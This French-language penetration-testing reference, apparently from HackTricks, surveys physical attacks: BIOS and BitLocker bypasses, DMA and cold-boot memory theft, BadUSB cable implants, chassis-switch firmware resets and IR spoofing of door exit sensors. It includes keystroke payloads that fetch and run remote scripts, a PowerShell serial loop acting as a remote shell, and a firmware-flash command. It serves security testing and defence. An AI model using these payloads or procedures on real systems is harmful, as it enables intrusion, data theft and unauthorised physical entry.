# Attaques physiques

{{#include ../banners/hacktricks-training.md}}

## Récupération du mot de passe BIOS et sécurité du système

**La réinitialisation du BIOS** peut être réalisée de plusieurs manières. La plupart des cartes mères incluent une **batterie** qui, lorsqu'elle est retirée pendant environ **30 minutes**, réinitialisera les paramètres du BIOS, y compris le mot de passe. Alternativement, un **jumper sur la carte mère** peut être ajusté pour réinitialiser ces paramètres en connectant des broches spécifiques.

Pour les situations où des ajustements matériels ne sont pas possibles ou pratiques, **des outils logiciels** offrent une solution. Lancer un système depuis un **Live CD/USB** avec des distributions comme **Kali Linux** donne accès à des outils tels que **_killCmos_** et **_CmosPWD_**, qui peuvent aider à la récupération du mot de passe BIOS.

Dans les cas où le mot de passe BIOS est inconnu, le saisir incorrectement **trois fois** entraînera généralement un code d'erreur. Ce code peut être utilisé sur des sites web comme [https://bios-pw.org](https://bios-pw.org) pour éventuellement récupérer un mot de passe utilisable.

### Sécurité UEFI

Pour les systèmes modernes utilisant **UEFI** au lieu du BIOS traditionnel, l'outil **chipsec** peut être utilisé pour analyser et modifier les paramètres UEFI, y compris la désactivation de **Secure Boot**. Cela peut être accompli avec la commande suivante :
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

La RAM conserve les données brièvement après la coupure d'alimentation, généralement pendant **1 to 2 minutes**. Cette persistance peut être étendue à **10 minutes** en appliquant des substances froides, comme l'azote liquide. Pendant cette période étendue, un **memory dump** peut être créé en utilisant des outils comme **dd.exe** et **volatility** pour analyse.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** est un outil conçu pour la **manipulation de la mémoire physique** via DMA, compatible avec des interfaces comme **FireWire** et **Thunderbolt**. Il permet de contourner les procédures de connexion en modifiant la mémoire pour accepter n'importe quel mot de passe. Cependant, il est inefficace contre les systèmes **Windows 10**.

---

## Live CD/USB for System Access

Remplacer des binaires système comme **_sethc.exe_** ou **_Utilman.exe_** par une copie de **_cmd.exe_** peut fournir une invite de commande avec les privilèges système. Des outils tels que **chntpw** peuvent être utilisés pour éditer le fichier **SAM** d'une installation Windows, permettant de changer les mots de passe.

**Kon-Boot** est un outil qui facilite la connexion à des systèmes Windows sans connaître le mot de passe en modifiant temporairement le kernel Windows ou l'UEFI. Plus d'informations sont disponibles sur [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: Accéder aux paramètres du BIOS.
- **F8**: Entrer en mode de récupération.
- Appuyer sur **Shift** après le bandeau Windows peut contourner l'ouverture de session automatique.

### BAD USB Devices

Des appareils comme **Rubber Ducky** et **Teensyduino** servent de plateformes pour créer des appareils **bad USB**, capables d'exécuter des payloads prédéfinis lorsqu'ils sont connectés à un ordinateur cible.

### Volume Shadow Copy

Les privilèges administrateur permettent de créer des copies de fichiers sensibles, y compris le fichier **SAM**, via PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Des implants basés sur ESP32-S3 tels que **Evil Crow Cable Wind** se cachent à l'intérieur de câbles USB-A→USB-C ou USB-C↔USB-C, s'énuméRèrent purement comme un clavier USB et exposent leur stack C2 sur Wi‑Fi. L'opérateur n'a qu'à alimenter le câble depuis la machine victime, créer un hotspot nommé `Evil Crow Cable Wind` avec le mot de passe `123456789`, et naviguer vers [http://cable-wind.local/](http://cable-wind.local/) (ou son adresse DHCP) pour atteindre l'interface HTTP embarquée.
- L'UI du navigateur propose des onglets pour *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, et *Config*. Les payloads stockés sont taggés par OS, les dispositions de clavier sont changées à la volée, et les chaînes VID/PID peuvent être modifiées pour mimer des périphériques connus.
- Parce que le C2 vit à l'intérieur du câble, un téléphone peut préparer des payloads, déclencher leur exécution et gérer les identifiants Wi‑Fi sans toucher à l'OS de la machine — idéal pour des intrusions physiques à court temps d'exposition.

### OS-aware AutoExec payloads

- Les règles AutoExec lient un ou plusieurs payloads pour qu'ils s'exécutent immédiatement après l'énumération USB. L'implant effectue un fingerprinting OS léger et sélectionne le script correspondant.
- Exemple de workflow :
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Parce que l'exécution est non supervisée, il suffit de remplacer un câble de charge pour obtenir un accès initial « plug-and-pwn » dans le contexte de l'utilisateur connecté.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Un payload stocké ouvre une console et colle une boucle qui exécute tout ce qui arrive sur le nouveau périphérique série USB. Une variante minimale pour Windows est:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge :** L'implant maintient le canal USB CDC ouvert tandis que son ESP32-S3 lance un client TCP (Python script, Android APK, or desktop executable) vers l'opérateur. Les octets saisis dans la session TCP sont acheminés vers la boucle série ci‑dessus, permettant l'exécution de commandes à distance même sur des hôtes air-gapped. La sortie est limitée, donc les opérateurs exécutent généralement des commandes à l'aveugle (création de comptes, staging d'outils additionnels, etc.).

### Surface de mise à jour HTTP OTA

- Le même web stack expose généralement des mises à jour de firmware non authentifiées. Evil Crow Cable Wind écoute sur `/update` et flashe tout binaire téléversé :
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Les opérateurs sur le terrain peuvent hot-swap des fonctionnalités (e.g., flash USB Army Knife firmware) en cours d'engagement sans ouvrir le câble, permettant à l'implant de pivoter vers de nouvelles capacités tout en restant branché sur la machine cible.

## Contournement du chiffrement BitLocker

Le chiffrement BitLocker peut être potentiellement contourné si le **mot de passe de récupération** est trouvé dans un fichier de dump mémoire (**MEMORY.DMP**). Des outils comme **Elcomsoft Forensic Disk Decryptor** ou **Passware Kit Forensic** peuvent être utilisés à cette fin.

---

## Ingénierie sociale pour l'ajout d'une clé de récupération

Une nouvelle clé de récupération BitLocker peut être ajoutée via des tactiques d'ingénierie sociale, en convainquant un utilisateur d'exécuter une commande qui ajoute une nouvelle clé de récupération composée de zéros, simplifiant ainsi le processus de déchiffrement.

---

## Exploiter les commutateurs d'intrusion du châssis / de maintenance pour réinitialiser le BIOS aux paramètres d'usine

De nombreux ordinateurs portables modernes et ordinateurs de bureau au format compact intègrent un **interrupteur d'intrusion du châssis** surveillé par l'Embedded Controller (EC) et le firmware BIOS/UEFI. Alors que l'objectif principal de l'interrupteur est de déclencher une alerte lorsqu'un appareil est ouvert, les fabricants implémentent parfois un **raccourci de récupération non documenté** qui se déclenche lorsque l'interrupteur est basculé selon un schéma précis.

### Comment fonctionne l'attaque

1. L'interrupteur est câblé sur une **GPIO interrupt** de l'EC.
2. Le firmware exécuté sur l'EC garde une trace du **timing et du nombre d'appuis**.
3. Lorsqu'un motif codé en dur est reconnu, l'EC invoque une routine *mainboard-reset* qui **efface le contenu du NVRAM/CMOS du système**.
4. Au démarrage suivant, le BIOS charge les valeurs par défaut – **le mot de passe superviseur, les clés Secure Boot, et toute configuration personnalisée sont effacés**.

> Une fois Secure Boot désactivé et le mot de passe du firmware supprimé, l'attaquant peut simplement démarrer n'importe quelle image OS externe et obtenir un accès non restreint aux disques internes.

### Exemple réel – ordinateur portable Framework 13

Le raccourci de récupération pour le Framework 13 (11th/12th/13th-gen) est :
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Après le dixième cycle l'EC place un drapeau qui indique au BIOS d'effacer la NVRAM au prochain redémarrage. La procédure complète prend ~40 s et ne nécessite **rien d'autre qu'un tournevis**.

### Procédure d'exploitation générique

1. Mettre sous tension ou suspendre/réactiver la cible pour que l'EC soit en fonctionnement.
2. Retirer le couvercle inférieur pour exposer l'interrupteur d'intrusion/de maintenance.
3. Reproduire le motif de basculement spécifique au fabricant (consultez la documentation, les forums ou reverse-engineer le firmware de l'EC).
4. Remonter et redémarrer – les protections du firmware devraient être désactivées.
5. Démarrer sur un live USB (e.g. Kali Linux) et effectuer le post-exploitation habituel (credential dumping, data exfiltration, implantation de EFI binaries malveillants, etc.).

### Détection & atténuation

* Journaliser les événements d'intrusion du châssis dans la console de gestion de l'OS et les corréler avec des réinitialisations inattendues du BIOS.
* Utiliser des **scellés anti-manipulation** sur les vis/couvercles pour détecter l'ouverture.
* Garder les appareils dans des **zones physiquement contrôlées** ; supposer que l'accès physique équivaut à une compromission totale.
* Lorsque disponible, désactiver la fonctionnalité fournisseur “maintenance switch reset” ou exiger une autorisation cryptographique supplémentaire pour les réinitialisations de la NVRAM.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).
- Un capuchon en plastique empêche l'émetteur et le récepteur de se voir directement, donc le contrôleur suppose que toute porteuse validée provient d'une réflexion proche et active un relais qui ouvre la gâche de la porte.
- Une fois que le contrôleur croit qu'une cible est présente, il change souvent l'enveloppe de modulation sortante, mais le récepteur continue d'accepter toute rafale qui correspond à la porteuse filtrée.

### Déroulement de l'attaque
1. **Capture the emission profile** – connecter un analyseur logique aux broches du contrôleur pour enregistrer les formes d'onde avant détection et après détection qui pilotent la LED IR interne.
2. **Replay only the “post-detection” waveform** – retirer/ignorer l'émetteur d'origine et piloter une LED IR externe avec le motif déjà déclenché dès le départ. Parce que le récepteur ne se soucie que du nombre/pulsation des impulsions, il traite la porteuse usurpée comme une véritable réflexion et active la ligne de relais.
3. **Gate the transmission** – transmettre la porteuse en rafales ajustées (p.ex., dizaines de millisecondes ON, similaire OFF) pour fournir le nombre minimal d'impulsions sans saturer l'AGC du récepteur ni la logique de gestion des interférences. Une émission continue désensibilise rapidement le capteur et empêche le relais de s'enclencher.

### Long-Range Reflective Injection
- Remplacer la LED de banc par une diode IR haute puissance, un driver MOSFET et des optiques de focalisation permet de déclencher de manière fiable depuis ~6 m.
- L'attaquant n'a pas besoin de ligne de visée directe vers l'ouverture du récepteur ; viser le faisceau vers des murs intérieurs, des étagères ou des encadrements de porte visibles à travers une vitre permet à l'énergie réfléchie d'entrer dans le champ de vue d'environ 30° et imite un geste de main à courte portée.
- Parce que les récepteurs attendent seulement des réflexions faibles, un faisceau externe beaucoup plus puissant peut rebondir sur plusieurs surfaces et rester au-dessus du seuil de détection.

### Weaponised Attack Torch
- Intégrer le driver à l'intérieur d'une lampe de poche commerciale masque l'outil en plein jour. Remplacer la LED visible par une LED IR haute puissance adaptée à la bande du récepteur, ajouter un ATtiny412 (ou équivalent) pour générer les rafales ≈30 kHz, et utiliser un MOSFET pour faire couler le courant de la LED.
- Un objectif zoom télescopique resserre le faisceau pour la portée/la précision, tandis qu'un moteur à vibration contrôlé par MCU donne une confirmation haptique que la modulation est active sans émettre de lumière visible.
- Faire défiler plusieurs motifs de modulation stockés (fréquences porteuses et enveloppes légèrement différentes) augmente la compatibilité entre des familles de capteurs rebrandées, permettant à l'opérateur de balayer les surfaces réfléchissantes jusqu'à entendre le clic audible du relais et la libération de la porte.

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
